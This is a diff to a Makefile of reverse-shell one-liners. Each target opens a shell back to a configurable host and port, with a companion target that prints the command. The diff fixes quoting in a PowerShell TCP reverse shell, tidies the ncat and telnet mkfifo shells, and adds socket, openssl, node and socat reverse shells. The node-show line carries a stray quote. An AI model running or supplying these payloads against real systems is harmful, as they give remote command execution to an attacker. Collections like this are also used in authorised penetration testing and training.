@@ -87,10 +87,10 @@ zsh-show:
 ######################## POWERSHELL ########################
 
 pwsh:
-	pwsh -c '$$TCPClient = New-Object Net.Sockets.TCPClient($(HOST), $(PORT)); $$NetworkStream = $$TCPClient.GetStream(); $$StreamReader = New-Object IO.StreamReader($$NetworkStream); $$StreamWriter = New-Object IO.StreamWriter($$NetworkStream); $$StreamWriter.AutoFlush = $$true; $$Buffer = New-Object System.Byte[] 1024; while ($$TCPClient.Connected) { while ($$NetworkStream.DataAvailable) { $$RawData = $$NetworkStream.Read($$Buffer, 0, $$Buffer.Length); $$Code = ([text.encoding]::UTF8).GetString($$Buffer, 0, $$RawData -1) }; if ($$TCPClient.Connected -and $$Code.Length -gt 1) { $$Output = try { Invoke-Expression ($$Code) 2>&1 } catch { $$_ }; $$StreamWriter.Write("$$Output`n"); $$Code = $$null } }; $$TCPClient.Close(); $$NetworkStream.Close(); $$StreamReader.Close(); $$StreamWriter.Close()'
+	pwsh -c '$$TCPClient = New-Object Net.Sockets.TCPClient("$(HOST)", $(PORT)); $$NetworkStream = $$TCPClient.GetStream(); $$StreamReader = New-Object IO.StreamReader($$NetworkStream); $$StreamWriter = New-Object IO.StreamWriter($$NetworkStream); $$StreamWriter.AutoFlush = $$true; $$Buffer = New-Object System.Byte[] 1024; while ($$TCPClient.Connected) { while ($$NetworkStream.DataAvailable) { $$RawData = $$NetworkStream.Read($$Buffer, 0, $$Buffer.Length); $$Code = ([text.encoding]::UTF8).GetString($$Buffer, 0, $$RawData -1) }; if ($$TCPClient.Connected -and $$Code.Length -gt 1) { $$Output = try { Invoke-Expression ($$Code) 2>&1 } catch { $$_ }; $$StreamWriter.Write("$$Output`n"); $$Code = $$null } }; $$TCPClient.Close(); $$NetworkStream.Close(); $$StreamReader.Close(); $$StreamWriter.Close()'
 
 pwsh-show:
-	@printf "pwsh -c '\$$TCPClient = New-Object Net.Sockets.TCPClient($(HOST), $(PORT)); \$$NetworkStream = \$$TCPClient.GetStream(); \$$StreamReader = New-Object IO.StreamReader(\$$NetworkStream); \$$StreamWriter = New-Object IO.StreamWriter(\$$NetworkStream); \$$StreamWriter.AutoFlush = \$$true; \$$Buffer = New-Object System.Byte[] 1024; while (\$$TCPClient.Connected) { while (\$$NetworkStream.DataAvailable) { \$$RawData = \$$NetworkStream.Read(\$$Buffer, 0, \$$Buffer.Length); \$$Code = ([text.encoding]::UTF8).GetString(\$$Buffer, 0, \$$RawData -1) }; if (\$$TCPClient.Connected -and \$$Code.Length -gt 1) { \$$Output = try { Invoke-Expression (\$$Code) 2>&1 } catch { \$$_ }; \$$StreamWriter.Write(\"\$$Output\`n\"); \$$Code = \$$null } }; \$$TCPClient.Close(); \$$NetworkStream.Close(); \$$StreamReader.Close(); \$$StreamWriter.Close()'\n"
+	@printf "pwsh -c '\$$TCPClient = New-Object Net.Sockets.TCPClient(\"$(HOST)\", $(PORT)); \$$NetworkStream = \$$TCPClient.GetStream(); \$$StreamReader = New-Object IO.StreamReader(\$$NetworkStream); \$$StreamWriter = New-Object IO.StreamWriter(\$$NetworkStream); \$$StreamWriter.AutoFlush = \$$true; \$$Buffer = New-Object System.Byte[] 1024; while (\$$TCPClient.Connected) { while (\$$NetworkStream.DataAvailable) { \$$RawData = \$$NetworkStream.Read(\$$Buffer, 0, \$$Buffer.Length); \$$Code = ([text.encoding]::UTF8).GetString(\$$Buffer, 0, \$$RawData -1) }; if (\$$TCPClient.Connected -and \$$Code.Length -gt 1) { \$$Output = try { Invoke-Expression (\$$Code) 2>&1 } catch { \$$_ }; \$$StreamWriter.Write(\"\$$Output\`n\"); \$$Code = \$$null } }; \$$TCPClient.Close(); \$$NetworkStream.Close(); \$$StreamReader.Close(); \$$StreamWriter.Close()'\n"
 
 ############################################################
 
@@ -103,10 +103,10 @@ ncat1-show:
 	@printf "ncat -e $(SHELL) $(HOST) $(PORT)\n"
 
 ncat2:
-	mkfifo $(FILE); cat $(FILE) | /bin/bash 2>&1 | ncat 127.0.0.1 4444 > $(FILE)
+	mkfifo $(FILE); /bin/bash < $(FILE) 2>&1 | ncat 127.0.0.1 4444 > $(FILE); rm $(FILE)
 
 ncat2-show:
-	@printf "mkfifo $(FILE); cat $(FILE) | /bin/bash 2>&1 | ncat 127.0.0.1 4444 > $(FILE)\n"
+	@printf "mkfifo $(FILE); /bin/bash < $(FILE) 2>&1 | ncat 127.0.0.1 4444 > $(FILE); rm $(FILE)\n"
 
 ############################################################
 
@@ -119,9 +119,49 @@ telnet1-show:
 	@printf "telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)\n"
 
 telnet2:
-	mkfifo $(FILE); cat $(FILE) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT) > $(FILE)
+	mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | telnet $(HOST) $(PORT) > $(FILE); rm $(FILE)
 
 telnet2-show:
-	@printf "mkfifo $(FILE); cat $(FILE) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT) > $(FILE)\n"
+	@printf "mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | telnet $(HOST) $(PORT) > $(FILE); rm $(FILE)\n"
+
+############################################################
+
+########################## SOCKET ##########################
+
+socket:
+	socket -qvp '$(SHELL)' $(HOST) $(PORT)
+
+socket-show:
+	@printf "socket -qvp '$(SHELL)' $(HOST) $(PORT)\n"
+
+############################################################
+
+########################## TELNET ##########################
+
+openssl:
+	mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(FILE); rm $(FILE)
+
+openssl-show:
+	@printf "mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(FILE); rm $(FILE)\n"
+
+############################################################
+
+########################### NODE ###########################
+
+node:
+	node -e 'shell = require("child_process").spawn("$(SHELL)"); require("net").connect($(PORT), "$(HOST)", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'
+
+node-show:
+	@printf "node -e 'shell = require(\"child_process\").spawn(\"$(SHELL)\"); require(\"net\").connect($(PORT), \"$(HOST)\"", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'\n"
+
+############################################################
+
+########################## SOCAT ###########################
+
+socat:
+	socat tcp-connect:$(HOST):$(PORT) exec:$(SHELL),pty,stderr,setsid,sigint,sane
+
+socat-show:
+	@printf "socat tcp-connect:$(HOST):$(PORT) exec:$(SHELL),pty,stderr,setsid,sigint,sane\n"
 
 ############################################################
